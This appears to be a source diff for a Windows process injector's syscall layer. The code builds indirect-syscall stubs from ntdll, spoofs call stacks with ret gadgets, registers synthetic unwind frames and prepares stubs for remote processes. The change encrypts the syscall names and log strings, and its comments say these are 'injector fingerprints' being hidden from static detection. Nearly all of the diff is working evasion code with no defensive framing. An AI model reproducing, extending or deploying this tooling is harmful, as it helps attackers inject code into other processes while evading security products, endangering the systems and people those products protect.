@@ -59,10 +59,13 @@ void SyscallLog(int level, const char * fmt, ...)
     }
 }
 
-#define SC_LOG_OK(...)    SyscallLog(1, "[+] " __VA_ARGS__)
-#define SC_LOG_WARN(...)  SyscallLog(1, "[!] " __VA_ARGS__)
-#define SC_LOG_ERR(...)   SyscallLog(1, "[x] " __VA_ARGS__)
-#define SC_LOG_INFO(...)  SyscallLog(1, "[*] " __VA_ARGS__)
+// The diagnostic prefixes are folded into the encrypted format literal at each call site
+// (the SC_LOG_* call sites below carry their own prefix), so the macros pass the format through
+// verbatim. Keeping the prefix out of the macro is what lets the format stay out of .rdata.
+#define SC_LOG_OK(...)    SyscallLog(1, __VA_ARGS__)
+#define SC_LOG_WARN(...)  SyscallLog(1, __VA_ARGS__)
+#define SC_LOG_ERR(...)   SyscallLog(1, __VA_ARGS__)
+#define SC_LOG_INFO(...)  SyscallLog(1, __VA_ARGS__)
 
 namespace
 {
@@ -111,29 +114,39 @@ namespace
 	constexpr size_t kSyscallTableCount	= sizeof(g_SyscallTable) / sizeof(g_SyscallTable[0]);
 	constexpr DWORD	kStubAreaSize		= static_cast<DWORD>(kSyscallTableCount) * SC_STUB_SIZE;
 
-	const char * kSyscallNames[kSyscallTableCount] =
+	// The syscall names are an injector signature on their own, so they are held as encrypted
+	// literals and decrypted only for the moment they are printed. Each entry is a separate
+	// decryption site, so the names never exist in .rdata in the clear.
+	//
+	// The text is returned by value: XorDecrypted wipes its buffer on scope exit, so handing out
+	// its .get() pointer would leave the caller with a dangling reference.
+	std::string SyscallName(DWORD Index)
 	{
-		"NtOpenProcess",
-		"NtOpenThread",
-		"NtDuplicateObject",
-		"NtQuerySystemInformation",
-		"NtQueryInformationProcess",
-		"NtQueryInformationThread",
-		"NtAllocateVirtualMemory",
-		"NtFreeVirtualMemory",
-		"NtProtectVirtualMemory",
-		"NtWriteVirtualMemory",
-		"NtReadVirtualMemory",
-		"NtSuspendThread",
-		"NtResumeThread",
-		"NtGetContextThread",
-		"NtSetContextThread",
-		"NtCreateSection",
-		"NtMapViewOfSection",
-		"NtUnmapViewOfSection",
-		"NtQuerySection",
-		"NtClose",
-	};
+		switch (Index)
+		{
+		case 0:  return XOR_STR_A("NtOpenProcess").get();
+		case 1:  return XOR_STR_A("NtOpenThread").get();
+		case 2:  return XOR_STR_A("NtDuplicateObject").get();
+		case 3:  return XOR_STR_A("NtQuerySystemInformation").get();
+		case 4:  return XOR_STR_A("NtQueryInformationProcess").get();
+		case 5:  return XOR_STR_A("NtQueryInformationThread").get();
+		case 6:  return XOR_STR_A("NtAllocateVirtualMemory").get();
+		case 7:  return XOR_STR_A("NtFreeVirtualMemory").get();
+		case 8:  return XOR_STR_A("NtProtectVirtualMemory").get();
+		case 9:  return XOR_STR_A("NtWriteVirtualMemory").get();
+		case 10: return XOR_STR_A("NtReadVirtualMemory").get();
+		case 11: return XOR_STR_A("NtSuspendThread").get();
+		case 12: return XOR_STR_A("NtResumeThread").get();
+		case 13: return XOR_STR_A("NtGetContextThread").get();
+		case 14: return XOR_STR_A("NtSetContextThread").get();
+		case 15: return XOR_STR_A("NtCreateSection").get();
+		case 16: return XOR_STR_A("NtMapViewOfSection").get();
+		case 17: return XOR_STR_A("NtUnmapViewOfSection").get();
+		case 18: return XOR_STR_A("NtQuerySection").get();
+		case 19: return XOR_STR_A("NtClose").get();
+		default: return XOR_STR_A("Unknown").get();
+		}
+	}
 
 	struct RESOLUTION_INFO
 	{
@@ -760,9 +773,9 @@ namespace
 
 		if (AmegerDiagEnabled())
 		{
-			SC_LOG_INFO("Stub Emit Check: emitted=%d bytes, SC_STUB_SIZE=%d, delta=%d",
+			SC_LOG_INFO(XOR_STR_A("[*] Stub Emit Check: emitted=%d bytes, SC_STUB_SIZE=%d, delta=%d").get(),
 				kEmitted, static_cast<int>(SC_STUB_SIZE), static_cast<int>(SC_STUB_SIZE) - kEmitted);
-			SC_LOG_INFO("Stub Layout Check: insns=[4 5 10 5 10 4 5 3 6]=%d | Restore Gadget=[%d..%d) %d | Trampoline=[%d..%d) %d | Used=%d | Slack=%d",
+			SC_LOG_INFO(XOR_STR_A("[*] Stub Layout Check: insns=[4 5 10 5 10 4 5 3 6]=%d | Restore Gadget=[%d..%d) %d | Trampoline=[%d..%d) %d | Used=%d | Slack=%d").get(),
 				kEmitted,
 				static_cast<int>(SC_STUB_RESTORE_OFFSET), static_cast<int>(SC_STUB_RESTORE_SIZE),
 				static_cast<int>(SC_SPOOF_RESTORE_GADGET_SIZE),
@@ -773,7 +786,7 @@ namespace
 
 		if (!trampoline_emitted)
 		{
-			SC_LOG_WARN("Stub Trampoline Displacement Out Of Range (%lld); Only The Direct Gadget Path Is Usable",
+			SC_LOG_WARN(XOR_STR_A("[!] Stub Trampoline Displacement Out Of Range (%lld); Only The Direct Gadget Path Is Usable").get(),
 				static_cast<long long>(trampoline_delta));
 		}
 
@@ -891,7 +904,7 @@ namespace
 bool BuildPool()
 {
 	void * gadget = SyscallGadgetAddress();
-	SC_LOG_INFO("Building Syscall Stub Pool (%zu Entries, %u Bytes Each)...", kSyscallTableCount, SC_STUB_SIZE);
+	SC_LOG_INFO(XOR_STR_A("[*] Building Syscall Stub Pool (%zu Entries, %u Bytes Each)...").get(), kSyscallTableCount, SC_STUB_SIZE);
 
 
 
@@ -909,7 +922,7 @@ bool BuildPool()
 
 	if (!gadget_healthy)
 	{
-		SC_LOG_WARN("HallWatch Fallback Engaged: Gadget %p First Two Bytes = %02X %02X (Not 0F 05); Using Direct Stubs (Detectable)",
+		SC_LOG_WARN(XOR_STR_A("[!] HallWatch Fallback Engaged: Gadget %p First Two Bytes = %02X %02X (Not 0F 05); Using Direct Stubs (Detectable)").get(),
 			gadget,
 			gadget ? static_cast<unsigned>(ReCa<const BYTE *>(gadget)[0]) : 0,
 			gadget ? static_cast<unsigned>(ReCa<const BYTE *>(gadget)[1]) : 0);
@@ -918,7 +931,7 @@ bool BuildPool()
 	BYTE * Pool = ReCa<BYTE *>(VirtualAlloc(nullptr, kStubAreaSize + 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 	if (!Pool)
 	{
-		SC_LOG_ERR("VirtualAlloc Failed For Stub Pool");
+		SC_LOG_ERR(XOR_STR_A("[x] VirtualAlloc Failed For Stub Pool").get());
 		return false;
 	}
 
@@ -942,7 +955,7 @@ bool BuildPool()
 			}
 
 			VirtualFree(Pool, 0, MEM_RELEASE);
-			SC_LOG_ERR("Stub Pool Layout Invalid Or ntdll Syscall Gadget Unavailable");
+			SC_LOG_ERR(XOR_STR_A("[x] Stub Pool Layout Invalid Or ntdll Syscall Gadget Unavailable").get());
 			return false;
 		}
 	}
@@ -975,7 +988,7 @@ bool BuildPool()
 		if (!WriteStub(slot, Entry.Service, gadget, reinterpret_cast<ULONG_PTR>(GadgetSlot),
 			reinterpret_cast<ULONG_PTR>(slot)))
 		{
-			SC_LOG_ERR("Syscall Stub Displacement Out Of Range For Entry %zu", i);
+			SC_LOG_ERR(XOR_STR_A("[x] Syscall Stub Displacement Out Of Range For Entry %zu").get(), i);
 			continue;
 		}
 
@@ -987,7 +1000,7 @@ bool BuildPool()
 	if (!Written)
 	{
 		VirtualFree(Pool, 0, MEM_RELEASE);
-		SC_LOG_ERR("No Valid Syscall Entries To Write");
+		SC_LOG_ERR(XOR_STR_A("[x] No Valid Syscall Entries To Write").get());
 		return false;
 	}
 
@@ -1024,7 +1037,7 @@ bool BuildPool()
 		}
 
 		VirtualFree(Pool, 0, MEM_RELEASE);
-		SC_LOG_ERR("VirtualProtect RX Failed");
+		SC_LOG_ERR(XOR_STR_A("[x] VirtualProtect RX Failed").get());
 		return false;
 	}
 
@@ -1058,18 +1071,18 @@ bool BuildPool()
 		{
 			const BOOL added = add_fn(func_table.data(), static_cast<DWORD>(func_table.size()),
 				static_cast<DWORD64>(reinterpret_cast<ULONG_PTR>(Pool)));
-			SC_LOG_INFO("Frame Synthesis: %u Synthetic .pdata Entries Registered (Base %p) = %s",
-				static_cast<unsigned>(func_table.size()), Pool, added ? "OK" : "FAILED");
+			SC_LOG_INFO(XOR_STR_A("[*] Frame Synthesis: %u Synthetic .pdata Entries Registered (Base %p) = %s").get(),
+				static_cast<unsigned>(func_table.size()), Pool, added ? XOR_STR_A("OK").get() : XOR_STR_A("FAILED").get());
 		}
 		else
 		{
-			SC_LOG_WARN("Frame Synthesis: %s Unavailable; Walker Resolution Unavailable", rtl_add_name.get());
+			SC_LOG_WARN(XOR_STR_A("[!] Frame Synthesis: %s Unavailable; Walker Resolution Unavailable").get(), rtl_add_name.get());
 		}
 	}
 
 	g_SyscallPool.store(Pool, std::memory_order_release);
 
-	SC_LOG_OK("Stub Pool Built: %u/%zu Stubs At %p (RX)", Written, kSyscallTableCount, Pool);
+	SC_LOG_OK(XOR_STR_A("[+] Stub Pool Built: %u/%zu Stubs At %p (RX)").get(), Written, kSyscallTableCount, Pool);
 	return true;
 }
 }
@@ -1119,17 +1132,17 @@ DWORD SyscallResolveAll()
 			}
 		}
 
-		SC_LOG_OK("Syscall Pool Already Ready (%u/%zu Stubs)", Ready, kSyscallTableCount);
+		SC_LOG_OK(XOR_STR_A("[+] Syscall Pool Already Ready (%u/%zu Stubs)").get(), Ready, kSyscallTableCount);
 		return Ready;
 	}
 
-	SC_LOG_INFO("Resolving Syscall Service Numbers From ntdll...");
+	SC_LOG_INFO(XOR_STR_A("[*] Resolving Syscall Service Numbers From ntdll...").get());
 
 	auto ntdll_name = XOR_STR_W(L"ntdll.dll");
 	const BYTE * Ntdll = ReCa<const BYTE *>(GetModuleHandleW(ntdll_name.get()));
 	if (!Ntdll)
 	{
-		SC_LOG_ERR("ntdll.dll Not Loaded");
+		SC_LOG_ERR(XOR_STR_A("[x] ntdll.dll Not Loaded").get());
 		return 0;
 	}
 
@@ -1137,11 +1150,11 @@ DWORD SyscallResolveAll()
 	const IMAGE_EXPORT_DIRECTORY * Export = LocateExportDirectory(Ntdll, ImageSize);
 	if (!Export)
 	{
-		SC_LOG_ERR("Failed To Locate ntdll Export Directory");
+		SC_LOG_ERR(XOR_STR_A("[x] Failed To Locate ntdll Export Directory").get());
 		return 0;
 	}
 
-	SC_LOG_INFO("ntdll Base: %p | ImageSize: 0x%X | Exports: %u", Ntdll, ImageSize, Export->NumberOfNames);
+	SC_LOG_INFO(XOR_STR_A("[*] ntdll Base: %p | ImageSize: 0x%X | Exports: %u").get(), Ntdll, ImageSize, Export->NumberOfNames);
 
 
 
@@ -1152,7 +1165,7 @@ DWORD SyscallResolveAll()
 	}
 	catch (...)
 	{
-		SC_LOG_ERR("Failed To Reserve Harvest Buffer");
+		SC_LOG_ERR(XOR_STR_A("[x] Failed To Reserve Harvest Buffer").get());
 		return 0;
 	}
 	HARVESTED_ENTRY * Harvested = nullptr;
@@ -1249,7 +1262,7 @@ DWORD SyscallResolveAll()
 
 
 
-					LOG(2, "Syscall: The Harvest Table Could Not Grow; One Service Was Left Unresolved\n");
+					LOG(2, XOR_STR_A("Syscall: The Harvest Table Could Not Grow; One Service Was Left Unresolved\n").get());
 				}
 			}
 
@@ -1275,7 +1288,7 @@ DWORD SyscallResolveAll()
 		}
 	}
 
-	SC_LOG_INFO("Pass 1: Scanned %u Exports | Matched %u | Healthy %u | Rerouted %u | Unreadable %u",
+	SC_LOG_INFO(XOR_STR_A("[*] Pass 1: Scanned %u Exports | Matched %u | Healthy %u | Rerouted %u | Unreadable %u").get(),
 		Export->NumberOfNames, matched, healthy, rerouted, oob);
 
 
@@ -1378,7 +1391,7 @@ DWORD SyscallResolveAll()
 					{
 						g_SyscallTable[i].Service = static_cast<DWORD>(Reconstructed);
 						g_Resolution[i].Reconstructed = true;
-						SC_LOG_INFO("Recovered %s Via SSN 0x%04X + %u | Distance: 0x%X Bytes | Stride %u Bytes/SSN", kSyscallNames[i], Lower->Service, offset_calls, span_rva, stride_bytes);
+						SC_LOG_INFO(XOR_STR_A("[*] Recovered %s Via SSN 0x%04X + %u | Distance: 0x%X Bytes | Stride %u Bytes/SSN").get(), SyscallName(static_cast<DWORD>(i)).c_str(), Lower->Service, offset_calls, span_rva, stride_bytes);
 					}
 				}
 			}
@@ -1395,11 +1408,11 @@ DWORD SyscallResolveAll()
 			++reconstructed;
 		}
 	}
-	SC_LOG_INFO("Pass 2: Reconstructed %u/%zu Services", reconstructed, kSyscallTableCount);
+	SC_LOG_INFO(XOR_STR_A("[*] Pass 2: Reconstructed %u/%zu Services").get(), reconstructed, kSyscallTableCount);
 
 	if (!BuildPool())
 	{
-		SC_LOG_ERR("Failed To Build Syscall Stub Pool");
+		SC_LOG_ERR(XOR_STR_A("[x] Failed To Build Syscall Stub Pool").get());
 		return 0;
 	}
 	DWORD Ready = 0;
@@ -1413,21 +1426,24 @@ DWORD SyscallResolveAll()
 
 
 
-	SC_LOG_INFO("[Syscall] [*] Local ntdll.dll Base: %p (Size: 0x%X)\n", Ntdll, ImageSize);
-	SC_LOG_INFO("[Syscall] [*] Export Census: %u Total Exports Harvested (%u Healthy)\n", Export->NumberOfNames, healthy);
-	SC_LOG_INFO("[Syscall] [=] System Service Resolution Table:\n");
-	SC_LOG_INFO("  Idx  Service Name              SSN      Status        Prologue      Address               Method\n");
+	SC_LOG_INFO(XOR_STR_A("[*] [Syscall] [*] Local ntdll.dll Base: %p (Size: 0x%X)\n").get(), Ntdll, ImageSize);
+	SC_LOG_INFO(XOR_STR_A("[*] [Syscall] [*] Export Census: %u Total Exports Harvested (%u Healthy)\n").get(), Export->NumberOfNames, healthy);
+	SC_LOG_INFO(XOR_STR_A("[*] [Syscall] [=] System Service Resolution Table:\n").get());
+	SC_LOG_INFO(XOR_STR_A("[*]   Idx  Service Name              SSN      Status        Prologue      Address               Method\n").get());
 	for (size_t ti = 0; ti < kSyscallTableCount; ++ti)
 	{
 		const DWORD svc = g_SyscallTable[ti].Service;
 		const bool valid = (svc != kServiceUnknown && svc != static_cast<DWORD>(kInvalidService));
-		const char * status = !valid ? "Failed" : (g_Resolution[ti].Reconstructed ? "Hooked" : (g_Resolution[ti].Hooked ? "Hooked" : "Clean"));
-		const char * method = !valid ? "Unresolved" : (g_Resolution[ti].Reconstructed ? "Neighbor Interp" : "Direct Export");
+		// The status and method labels are injector fingerprints, so they are encrypted literals.
+		// SECURE_STR_* copies each label into its own per-thread buffer, so the text stays valid
+		// past the statement that produced it.
+		const std::string status = !valid ? XOR_STR_A("Failed").get() : (g_Resolution[ti].Reconstructed ? XOR_STR_A("Hooked").get() : (g_Resolution[ti].Hooked ? XOR_STR_A("Hooked").get() : XOR_STR_A("Clean").get()));
+		const std::string method = !valid ? XOR_STR_A("Unresolved").get() : (g_Resolution[ti].Reconstructed ? XOR_STR_A("Neighbor Interp").get() : XOR_STR_A("Direct Export").get());
 		const void * addr = valid ? ReCa<const void *>(Ntdll + g_Resolution[ti].Rva) : nullptr;
-		SC_LOG_INFO("  [%02zu] %-24s 0x%04X   %-8s    %02X %02X %02X %02X  %p  %s\n",
-			ti, kSyscallNames[ti], valid ? svc : 0, status,
+		SC_LOG_INFO(XOR_STR_A("[*]   [%02zu] %-24s 0x%04X   %-8s    %02X %02X %02X %02X  %p  %s\n").get(),
+			ti, SyscallName(static_cast<DWORD>(ti)).c_str(), valid ? svc : 0, status.c_str(),
 			g_Resolution[ti].Prologue[0], g_Resolution[ti].Prologue[1], g_Resolution[ti].Prologue[2], g_Resolution[ti].Prologue[3],
-			addr, method);
+			addr, method.c_str());
 	}
 	bool verification_passed = true;
 	{
@@ -1444,19 +1460,19 @@ DWORD SyscallResolveAll()
 			}
 			if (is_rx)
 			{
-				SC_LOG_OK("[Syscall] [+] Stub Pool Staging: VA = %p | Size = 0x%X Bytes\n", pool, kStubAreaSize);
-				SC_LOG_OK("[Syscall] [+] Memory Protection Query: Protect = 0x%08X (%s) | RWX Count = %u\n",
-					mbi.Protect, "PAGE_EXECUTE_READ", rwx_count);
+				SC_LOG_OK(XOR_STR_A("[+] [Syscall] [+] Stub Pool Staging: VA = %p | Size = 0x%X Bytes\n").get(), pool, kStubAreaSize);
+				SC_LOG_OK(XOR_STR_A("[+] [Syscall] [+] Memory Protection Query: Protect = 0x%08X (%s) | RWX Count = %u\n").get(),
+					mbi.Protect, XOR_STR_A("PAGE_EXECUTE_READ").get(), rwx_count);
 			}
 			else
 			{
-				SC_LOG_ERR("[Syscall] [x] Stub Pool Protection Mismatch = 0x%08X (RWX = %u)\n", mbi.Protect, rwx_count);
+				SC_LOG_ERR(XOR_STR_A("[x] [Syscall] [x] Stub Pool Protection Mismatch = 0x%08X (RWX = %u)\n").get(), mbi.Protect, rwx_count);
 				verification_passed = false;
 			}
 		}
 		else
 		{
-			SC_LOG_ERR("[Syscall] [x] Stub Pool Not Queryable; Protection Unverified\n");
+			SC_LOG_ERR(XOR_STR_A("[x] [Syscall] [x] Stub Pool Not Queryable; Protection Unverified\n").get());
 			verification_passed = false;
 		}
 	}
@@ -1466,7 +1482,7 @@ DWORD SyscallResolveAll()
 
 	if (!verification_passed)
 	{
-		SC_LOG_ERR("[Syscall] [x] Stub Pool W^X Verification Failed; Marking Layer Unavailable\n");
+		SC_LOG_ERR(XOR_STR_A("[x] [Syscall] [x] Stub Pool W^X Verification Failed; Marking Layer Unavailable\n").get());
 		g_SyscallPoolReady.store(false, std::memory_order_release);
 		return 0;
 	}
@@ -1474,11 +1490,11 @@ DWORD SyscallResolveAll()
 	g_SyscallPoolReady.store(true, std::memory_order_release);
 	if (Ready == kSyscallTableCount)
 	{
-		SC_LOG_OK("Syscall Layer Ready: %u/%zu Stubs Built\n", Ready, kSyscallTableCount);
+		SC_LOG_OK(XOR_STR_A("[+] Syscall Layer Ready: %u/%zu Stubs Built\n").get(), Ready, kSyscallTableCount);
 	}
 	else
 	{
-		SC_LOG_WARN("Syscall Layer Incomplete: %u/%zu Stubs Built - %zu Unresolved\n",
+		SC_LOG_WARN(XOR_STR_A("[!] Syscall Layer Incomplete: %u/%zu Stubs Built - %zu Unresolved\n").get(),
 			Ready, kSyscallTableCount, static_cast<size_t>(kSyscallTableCount - Ready));
 	}
 	return Ready;
@@ -1694,11 +1710,11 @@ DWORD BuildSyscallStubs(BYTE * Destination, SIZE_T DestinationSize, const DWORD 
 	void * gadget = SyscallGadgetAddress();
 	if (!gadget)
 	{
-		SC_LOG_ERR("Remote Syscall Stubs Require The ntdll Syscall Gadget");
+		SC_LOG_ERR(XOR_STR_A("[x] Remote Syscall Stubs Require The ntdll Syscall Gadget").get());
 		return 0;
 	}
 
-	SC_LOG_INFO("Safe Stack Spoof: Overwriting [rsp] with ntdll Ret Gadget at 0x%p", (void *)(reinterpret_cast<BYTE *>(gadget) + 2));
+	SC_LOG_INFO(XOR_STR_A("[*] Safe Stack Spoof: Overwriting [rsp] with ntdll Ret Gadget at 0x%p").get(), (void *)(reinterpret_cast<BYTE *>(gadget) + 2));
 
 	// Vector 7: HallWatch — re-read the gadget's first two bytes; if not 0F 05, use direct stubs.
 	const bool gadget_healthy =
@@ -1707,7 +1723,7 @@ DWORD BuildSyscallStubs(BYTE * Destination, SIZE_T DestinationSize, const DWORD 
 
 	if (!gadget_healthy)
 	{
-		SC_LOG_WARN("HallWatch Fallback Engaged (Remote Stubs): Gadget %p Bytes = %02X %02X (Not 0F 05); Direct Stubs (Detectable)",
+		SC_LOG_WARN(XOR_STR_A("[!] HallWatch Fallback Engaged (Remote Stubs): Gadget %p Bytes = %02X %02X (Not 0F 05); Direct Stubs (Detectable)").get(),
 			gadget,
 			static_cast<unsigned>(ReCa<const BYTE *>(gadget)[0]),
 			static_cast<unsigned>(ReCa<const BYTE *>(gadget)[1]));
@@ -1735,7 +1751,7 @@ DWORD BuildSyscallStubs(BYTE * Destination, SIZE_T DestinationSize, const DWORD 
 
 	if (sampled && g_RetGadgetPoolCount < (FAKE_STACK_SLOTS - 1))
 	{
-		SC_LOG_ERR("Tier 2 Fake Stack Unavailable: Only %llu Bare Ret Gadgets Found In ntdll (Need %u); Refusing Sampled Stubs",
+		SC_LOG_ERR(XOR_STR_A("[x] Tier 2 Fake Stack Unavailable: Only %llu Bare Ret Gadgets Found In ntdll (Need %u); Refusing Sampled Stubs").get(),
 			static_cast<unsigned long long>(g_RetGadgetPoolCount), FAKE_STACK_SLOTS - 1);
 		return 0;
 	}
@@ -1786,7 +1802,7 @@ DWORD BuildSyscallStubs(BYTE * Destination, SIZE_T DestinationSize, const DWORD 
 					RingBase, SysIdxAddr, fake_stack_address, saved_rsp_address,
 					static_cast<BYTE>(i), gadget_healthy))
 				{
-					SC_LOG_ERR("Sampled Remote Syscall Stub %u Displacement Out Of Range", i);
+					SC_LOG_ERR(XOR_STR_A("[x] Sampled Remote Syscall Stub %u Displacement Out Of Range").get(), i);
 					break;
 				}
 			}
@@ -1797,7 +1813,7 @@ DWORD BuildSyscallStubs(BYTE * Destination, SIZE_T DestinationSize, const DWORD 
 				// return chain is identical either way, so frame synthesis stays valid.
 				if (!WriteStub(slot, g_SyscallTable[j].Service, gadget, gadget_slot_address, stub_address))
 				{
-					SC_LOG_ERR("Remote Syscall Stub %u Displacement Out Of Range", i);
+					SC_LOG_ERR(XOR_STR_A("[x] Remote Syscall Stub %u Displacement Out Of Range").get(), i);
 					break;
 				}
 			}
@@ -1805,7 +1821,7 @@ DWORD BuildSyscallStubs(BYTE * Destination, SIZE_T DestinationSize, const DWORD 
 			{
 				if (!WriteStub(slot, g_SyscallTable[j].Service, gadget, gadget_slot_address, stub_address))
 				{
-					SC_LOG_ERR("Remote Syscall Stub %u Displacement Out Of Range", i);
+					SC_LOG_ERR(XOR_STR_A("[x] Remote Syscall Stub %u Displacement Out Of Range").get(), i);
 					break;
 				}
 			}
